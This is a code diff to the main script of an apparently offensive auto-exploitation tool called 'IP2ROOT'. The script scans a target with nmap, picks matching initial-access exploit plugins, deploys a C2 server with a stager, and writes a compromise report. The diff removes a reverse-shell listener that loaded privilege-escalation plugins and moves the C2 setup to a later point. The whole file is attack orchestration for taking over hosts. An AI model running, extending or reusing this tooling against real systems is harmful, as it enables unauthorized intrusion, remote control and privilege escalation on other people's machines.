@@ -3,14 +3,12 @@ import socket
 import recon
 import socket
 from multiprocessing import Process
-import rs_client
 import sys
 import configparser
 import os
 from utils import *
 from plugins.initial_access import *
 import constants
-import privesc
 import c2
 
 def read_plugins_configs() -> dict:
@@ -36,28 +34,6 @@ def read_plugins_configs() -> dict:
     return configs
 
 
-def listener(listener_port: int, listener_address: str, compromission_recap_file_name: str) -> None:
-    """
-    Create a listener that waits for a connection from the reverse shell
-    """
-    sys.stdin = open(0)
-    persistent = False
-    hosts = None
-    sock = None
-
-    if hosts:
-        hosts = hosts.split(",")
-
-    try:
-        sock = rs_client.Socket(listener_port, listener_address)
-        sock.listen(hosts)
-        shell = rs_client.Shell(sock, persistent)
-        privesc.load_all_plugins(sock, shell, compromission_recap_file_name)
-
-    except KeyboardInterrupt:
-        sock.close()
-
-
 def run_initial_access_plugin(plugin_name: str, plugin_config:list, target_ip: str, target_port: int, local_ip: str, local_port: int, compromission_recap_file_name: str, token: str) -> None:
     """
     Run an initial access plugin
@@ -67,7 +43,7 @@ def run_initial_access_plugin(plugin_name: str, plugin_config:list, target_ip: s
         rs = c2.get_stager(safe_get(plugin_config, 'OS'), token)
         res = eval(plugin_name).exploit(target_ip, target_port, local_ip, local_port, rs)
         if res is True:
-            ('[+] Exploit was successful !')
+            print('[+] Exploit was successful !')
             if compromission_recap_file_name:
                 with open(compromission_recap_file_name, 'w') as report:
                     report.write('# IP2ROOT report\n\n')
@@ -99,7 +75,6 @@ def extract_ip() -> None | str:
     return IP
 
 
-
 def main() -> None | str:
     configs = read_plugins_configs()
     parser = argparse.ArgumentParser()
@@ -111,9 +86,7 @@ def main() -> None | str:
     parser.add_argument('-o', '--output', type=str, help='output report file name (.md format)', required=False)
     args = parser.parse_args()
 
-    # deploy c2 and start client
-    c2_infos = c2.c2()
-    c2.starkiller()
+    
 
     if args.local_ip == None:
         LOCAL_IP = extract_ip()
@@ -124,6 +97,10 @@ def main() -> None | str:
     validate_ip_address(args.target_ip)
     validate_ip_address(LOCAL_IP)
     
+    # deploy c2 and start client
+    c2_infos = c2.c2(LOCAL_IP)
+    c2.starkiller()
+
     res_recon = recon.nmap_scan(args.target_ip, args.remote_port)
 
     BUFFER_SIZE = 1024 * 128
@@ -138,11 +115,8 @@ def main() -> None | str:
             or (safe_get(i, 'http_title') and safe_get(values, 'http_title') and safe_get(values, 'http_title') in safe_get(i, 'http_title')):
                 exploit_available = True
                 target_port = i['port']
-                listener_process = Process(target=listener, args = (args.local_port, LOCAL_IP, args.output))
-                listener_process.start()
                 exploit_process = Process(target=run_initial_access_plugin, args = (plugin_name, values, args.target_ip, target_port, LOCAL_IP, args.local_port, args.output, c2_infos[1]))
                 exploit_process.start()
-                listener_process.join()
                 exploit_process.join()
         if not exploit_available:
             print('[-] No exploit available for this port')
